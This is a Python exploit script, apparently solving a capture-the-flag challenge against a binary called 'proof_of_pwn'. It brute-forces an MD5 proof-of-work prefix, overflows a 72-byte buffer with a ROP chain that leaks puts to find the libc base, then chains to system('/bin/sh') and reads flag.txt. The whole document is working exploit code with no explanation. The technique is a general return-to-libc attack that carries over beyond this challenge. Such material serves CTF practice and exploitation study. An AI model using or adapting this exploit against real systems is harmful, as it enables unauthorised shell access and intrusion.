def brute_payload(proof, pay):
	def md5(data):
		import hashlib
		m = hashlib.md5()
		m.update(data)
		return m.hexdigest().encode("utf-8")
	i = 0
	while True:
		pay2 = (pay+str(i).encode("utf-8"))[:128]
		h = md5(pay2)
		if proof[:4] == h[:4]:
			return pay2
		i += 1

from pwnapi import *

log.level      = 1
libc           = ELF("./libc.so.6")
context.binary = ELF("./proof_of_pwn")
p              = context.getprocess()

proof = p.recvline().split()[-1]
log.info("required proof: {}".format(proof.decode("utf-8")))

rop       = p64(context.binary.findgadgetbystr("pop rdi;ret"))
rop      += p64(context.binary.sym.got.puts)
rop      += p64(context.binary.sym.plt.puts)
rop      += p64(0x00400bed) # check function
payload   = brute_payload(proof, fit({72:rop}))

p.sendafter(b"\n", payload)
p.recvuntil(b"\n\n")

puts      = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = puts - libc.sym.puts
system    = libc_base + libc.sym.system
binsh     = libc_base + next(libc.search("/bin/sh"))
log.info("libc base:      0x{:x}".format(libc_base))
log.info("system:         0x{:x}".format(system))
log.info("binsh:          0x{:x}".format(binsh))

proof = p.recvline().split()[-1]
log.info("required proof: {}".format(proof.decode("utf-8")))

rop      = p64(context.binary.findgadgetbystr("pop rdi;ret"))
rop     += p64(binsh)
rop     += p64(system)
rop     += p64(context.binary.findgadgetbystr("mov eax, 0;leave;ret"))
payload  = brute_payload(proof, fit({72:rop}))

p.sendafter(b": \n", payload)
p.recvuntil(b"\n\n")

p.sendline(b"cat flag.txt; exit")
log.info("flag:           {}".format(p.recvall().decode("utf-8")))

p.close()
